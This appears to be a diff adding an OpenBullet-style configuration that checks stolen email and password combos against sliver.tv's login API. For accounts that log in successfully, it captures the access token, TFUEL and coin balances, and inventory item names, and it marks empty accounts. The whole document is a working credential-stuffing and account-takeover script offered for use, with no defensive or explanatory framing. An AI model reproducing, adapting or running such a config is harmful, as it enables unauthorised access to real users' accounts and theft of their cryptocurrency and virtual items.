@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "sliver.tv",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-10T21:12:20.6086993+02:00",
+  "AdditionalInfo": "",
+  "Author": "Desme#5333",
+  "Version": "1.3.6 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "<USER>",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 638722076
+    },
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 372293689
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.sliver.tv/v1/user/auth" 
+  CONTENT "{\"email_or_username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-App-Version: 4" 
+  HEADER "X-Platform: web" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"SUCCESS" 
+
+#TFUEL PARSE "<SOURCE>" JSON "tfuel" -> CAP "Tfuel" 
+
+#COINS PARSE "<SOURCE>" JSON "coins" -> CAP "Coins" 
+
+#USERID PARSE "<SOURCE>" JSON "id" -> VAR "USERID" 
+
+#ACCESS_TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+#GET_INVENTORY_COUNT REQUEST GET "https://api.sliver.tv/v1/user/<USERID>/inventory/count" 
+  
+  HEADER "X-Auth-Token: <TOKEN>" 
+  HEADER "X-Auth-User: <USERID>" 
+  HEADER "X-Platform: web" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36" 
+
+#COUNT PARSE "<SOURCE>" JSON "body" -> CAP "InventoryCount" 
+
+#GET_INVENTORY REQUEST GET "https://api.sliver.tv/v1/user/<USERID>/inventory/list?number=100" 
+  
+  HEADER "X-Auth-Token: <TOKEN>" 
+  HEADER "X-Auth-User: <USERID>" 
+  HEADER "X-Platform: web" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36" 
+
+#REGEX PARSE "<SOURCE>" REGEX "item\":{\"id\":\"(.*?)\",\"name\":\"(.*?)\",\"description\":" "[0]" Recursive=TRUE -> VAR "INVENTORY1" 
+
+#GET_INVENTORY_FROM_REGEX PARSE "<INVENTORY1>" LR "\",\"name\":\"" "\",\"" Recursive=TRUE -> CAP "INVENTORY" 
+
+#STATUS PARSE "<SOURCE>" LR "},\"status\":\"" "\"" Recursive=TRUE -> CAP "STATUS" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<InventoryCount>" EqualTo "0" 
+
